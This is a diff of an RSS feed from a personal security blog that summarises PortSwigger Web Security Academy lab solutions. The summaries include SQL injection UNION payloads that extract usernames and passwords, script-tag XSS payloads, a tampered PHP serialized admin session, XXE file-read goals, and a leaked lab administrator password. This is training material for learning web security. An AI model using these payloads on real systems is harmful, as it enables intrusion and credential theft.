@@ -1,10 +1,694 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger Web Security Academy :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/portswigger-web-security-academy/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/portswigger-web-security-academy/index.xml" rel="self" type="application/rss+xml"/><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/index.html</guid><description>CSRF - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
-Lab: CSRF vulnerability with no defenses Description: This lab’s email change functionality is vulnerable to CSRF. Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim. Background :::spoiler CSRF 攻擊原理 [Day25]- 新手的Web系列CSRF</description></item><item><title>Deserialization - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html</guid><description>Deserialization - APPRENTICE tags: Portswigger Web Security Academy Web Lab: Modifying serialized objects Description: This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. Goal: To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos’s account. You can log in to your own account using the following credentials: wiener:peter Recon Login First &amp; Recon the package According to the description, we know that the user verification has insecure deserialization. Therefore, we can recon the package first as below. You can notice the session is a base64-encoded string and we use the built-in feature in burp suite to decode it. Session: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d Decoded String: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;} How about Modify the session directly Exp - Change Directly We can use the built-in feature to change our session to admin=1 directly to then send it forward. :::info Each package may contain the session that should be modified. So, pay attention to before sending it forward ::: Delete Carlos :::spoiler Success Screenshot :::</description></item><item><title>Lab: Arbitrary object injection in PHP</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html</guid><description>Lab: Arbitrary object injection in PHP tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. Goal: To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos’s home directory. You will need to obtain source code access to solve this lab. You can log in to your own account using the following credentials: wiener:peter Hint: You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. Constructor &amp; Deconstructor Python建構函式與解構函式（init()和__del__()） 其實概念就是Python的__init()__ function，在instanciate一個class的時候扮演初始化的功能而已 而deconstructor就是Python中的__del__() function用來回收不需要的class，以達到降低記憶體的使用量</description></item><item><title>Lab: Blind XXE with out-of-band interaction</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html</guid><description>Lab: Blind XXE with out-of-band interaction tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain. Goal: To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: Background 有兩種廣泛的方法可以找到和利用Blind XXE 漏洞：</description></item><item><title>Lab: Blind XXE with out-of-band interaction via XML parameter entities</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html</guid><description>Lab: Blind XXE with out-of-band interaction via XML parameter entities tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. Goal: To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server. Background 這一題會用到Parameter Entity，也就是當server端擋掉外部的entity輸入時，可以直接在DOCTYPE中直接Reference，也就是利用%這個字元達到這個效果</description></item><item><title>Lab: CSRF where token is not tied to user session</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html</guid><description>Lab: CSRF where token is not tied to user session tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya Background CSRF token should tied to user session otherwise, it’ll exploited by attacker.</description></item><item><title>Lab: CSRF where token is tied to non-session cookie</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html</guid><description>Lab: CSRF where token is tied to non-session cookie tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.
-Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You have two accounts on the application that you can use to help design your attack. The credentials are as follows: wiener:peter carlos:montoya</description></item><item><title>Lab: CSRF where token validation depends on request method</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html</guid><description>Lab: CSRF where token validation depends on request method tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon Login and update email to trace the package Like the previous lab, we first login to the website and update the email. At the same time, we can trace update email package shown below: We can notice that the carried data including csrf_token</description></item><item><title>Lab: CSRF where token validation depends on token being present</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html</guid><description>Lab: CSRF where token validation depends on token being present tags: Portswigger Web Security Academy Web Description: This lab’s email change functionality is vulnerable to CSRF. Goal: To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. You can log in to your own account using the following credentials: wiener:peter Recon Login and update email to trace the package It’s very similar with previous lab $\to$ it contained CSRF_token as its carried data:</description></item><item><title>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html</guid><description>Lab: DOM XSS in document.write sink using source location.search inside a select element tags: Portswigger Web Security Academy Web Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. Recon Find the injection place I used string search to find location.search in each sub-page source. Here is the interesting code: :::spoiler Source Code ... &lt;script> var stores = ["London","Paris","Milan"]; var store = (new URLSearchParams(window.location.search)).get('storeId'); document.write('&lt;select name="storeId">'); if(store) { document.write('&lt;option selected>'+store+'&lt;/option>'); } for(var i=0;i&lt;stores.length;i++) { if(stores[i] === store) { continue; } document.write('&lt;option>'+stores[i]+'&lt;/option>'); } document.write('&lt;/select>'); &lt;/script> ... ::: Try type something about storeID as URL GET parameter Payload: /product?productId=1&amp;storeId=abc You can see that this is a perfect injection place Exp Payload: /product?productId=1&amp;storeId=&lt;script>alert(123);&lt;/script> :::spoiler Success Screenshot :::</description></item><item><title>Lab: Exploiting `XInclude` to retrieve files</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html</guid><description>Lab: Exploiting XInclude to retrieve files tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that embeds the user input inside a server-side XML document that is subsequently parsed. Because you don’t control the entire XML document you can’t define a DTD to launch a classic XXE attack. Goal: To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. Hint: By default, XInclude will try to parse the included document as XML. Since /etc/passwd isn’t valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior. Background XInclude is a part of the XML specification that allows an XML document to be built from sub documents You can place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server side XML document</description></item><item><title>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html</guid><description>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: To solve the lab, exfiltrate the contents of the /etc/hostname file. Hint: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator’s default public server. Recon Use the previous method :::spoiler Payload</description></item><item><title>Lab: Exploiting blind XXE to retrieve data via error messages</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html</guid><description>Lab: Exploiting blind XXE to retrieve data via error messages tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input but does not display the result. Goal: To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file. The lab contains a link to an exploit server on a different domain where you can host your malicious DTD. Recon This is very similar to the previous lab(Exploiting blind XXE to exfiltrate data using a malicious external DTD)</description></item><item><title>Lab: Exploiting Java deserialization with Apache Commons</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html</guid><description>Lab: Exploiting Java deserialization with Apache Commons tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don’t have source code access, you can still exploit this lab using pre-built gadget chains. Goal: To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos’s home directory. You can log in to your own account using the following credentials: wiener:peter Background ysoserial使用方法</description></item><item><title>Lab: Exploiting XXE via image file upload</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html</guid><description>Lab: Exploiting XXE via image file upload tags: Portswigger Web Security Academy Web Description: This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files. Goal: To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the “Submit solution” button to submit the value of the server hostname. Recon In this lab, we can upload an exploited file which contained malicious xml data. Then we can fetch some sensitive information.</description></item><item><title>Lab: Modifying serialized data types</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html</guid><description>Lab: Modifying serialized data types tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result Goal: To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos. You can log in to your own account using the following credentials: wiener:peter Background Loose Comparison Operator in PHP
-PHP based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator(==) when comparing different data types. For example: 5=="5" will be true when two types are different.</description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html</guid><description>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four: tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Exp Determine # of columns Payload: ?category=Gifts' union select NULL,NULL --</description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html</guid><description>Lab: SQL injection attack, listing the database contents on Oracle tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users. Goal: To solve the lab, log in as the administrator user. Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual Exp Determine # of columns Payload: ?category=Lifestyle' union select NULL,NULL from dual--</description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html</guid><description>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft tags: Portswigger Web Security Academy Web Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Goal: To solve the lab, display the database version string. Exp Consider # of column Payload: ?category=Accessories' union select NULL,NULL -- # Consider column type Payload: ?category=Accessories' union select 'a','a' -- # Both of them contained text. Attack Payload: ?category=Accessories' union select 'abc',@@version -- # :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html</guid><description>Lab: SQL injection attack, querying the database type and version on Oracle tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query. Our Goal: To solve the lab, display the database version string. Exp - SQLi Cheat Sheet - Examining the database in SQL injection attacks According to the cheat sheet above, we can use the command to fetch the version of this database, e.g. :::warning Before the recon, the hint told you that this database is created by Oracle. So, you must contained From preserved word in each query, e.g. SELECT 'abc' FROM dual :::</description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html</guid><description>Lab: SQL injection UNION attack, determining the number of columns returned by the query tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. Hint: To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. Exp Payload: https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL-- :::spoiler Success Screenshot :::</description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html</guid><description>Lab: SQL injection UNION attack, finding a column containing text tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. Exp Determine how many columns it has You can use the technique from previous question. Payload: ?category=' UNION SELECT NULL,NULL,NULL--</description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html</guid><description>Lab: SQL injection UNION attack, retrieving data from other tables tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp Using all technique we learned before According to union-based technique we learned before, we can consider there’re 2 columns in this database and both of them are text strings Payload: ?category=Lifestyle' UNION SELECT 'Title name','Post content'-- Find the detailed info in users table Payload: ?category=Lifestyle' UNION SELECT username, password FROM users-- Login as administrator Username: administrator Password: 5kg73b7jinl9plif82d3 :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html</guid><description>Lab: SQL injection UNION attack, retrieving multiple values in a single column tags: Portswigger Web Security Academy Web Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables. Hint: The database contains a different table called users, with columns called username and password. To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. Exp Consider how many columns in this table Payload: ?category=Lifestyle' UNION SELECT NULL,NULL-- Consider the type of each columns Payload: ?category=Lifestyle' UNION SELECT 1,'a'-- As the payload above, the 1st column is number-based string, and 2nd column is text-based string. :::spoiler Result ::: 通靈: Find username and password From the result above, there’s just one column is text-based string that we can inject, so we can use concatenate operator || to concatenate two strings that we query together. Payload: ?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users-- :::spoiler Result ::: Login by username and password that we fetch :::spoiler Success Screenshot ::: Reference</description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html</guid><description>Lab: Stored DOM XSS tags: Portswigger Web Security Academy Web Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality. Goal: To solve this lab, exploit this vulnerability to call the alert() function. Recon Find the injected place According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.
-Try to inject Comment Payload: &lt;script>alert(123)&lt;/script> Seems weird, and when you browse the page source, you’ll find out that it calls external js files to import the comment, i.e.:</description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html</guid><description>Lab: Using application functionality to exploit insecure deserialization tags: Portswigger Web Security Academy Web Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.
-Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.
-You can log in to your own account using the following credentials: wiener:peter You also have access to a backup account: gregg:rosebud</description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/index.html</guid><description>SQLi - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
-Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: SELECT * FROM products WHERE category = 'Gifts' AND released = 1 Exp Payload: https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20# :::spoiler Success Screenshot :::</description></item><item><title>XSS - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xss/xss---apprentice/index.html</guid><description>XSS - APPRENTICE tags: Portswigger Web Security Academy Web [TOC]
-Lab: Reflected XSS into HTML context with nothing encoded:zero: Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function. Exp Payload: &lt;script>alert(123)&lt;/script> :::spoiler Success Screenshot :::
-Lab: Stored XSS into HTML context with nothing encoded Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Exp You need to click into one post and comment something that contained script tag. Payload: &lt;script>alert(123)&lt;/script> :::spoiler Success Screenshot :::</description></item><item><title>XXE - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/index.html</guid><description>XXE - APPRENTICE tags: Portswigger Web Security Academy Web Description: This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. Goal: To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. Lab: Exploiting XXE using external entities to retrieve files Recon Use Burp Suite to intercept package You can notice that it use a normal xml format. Exp - Inject Directly Exploit Payload:</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Portswigger Web Security Academy on SBK Hugo Site</title><link>https://bernie6401.github.io/tags/portswigger-web-security-academy/</link><description>Recent content in Portswigger Web Security Academy on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/portswigger-web-security-academy/index.xml" rel="self" type="application/rss+xml"/><item><title>CSRF - APPRENTICE</title><link>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/</guid><description>&lt;h1 id="csrf---apprentice">
+ CSRF - APPRENTICE
+ &lt;a class="anchor" href="#csrf---apprentice">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;p>[TOC]&lt;/p>
+&lt;h2 id="lab-csrf-vulnerability-with-no-defenses">
+ Lab: CSRF vulnerability with no defenses
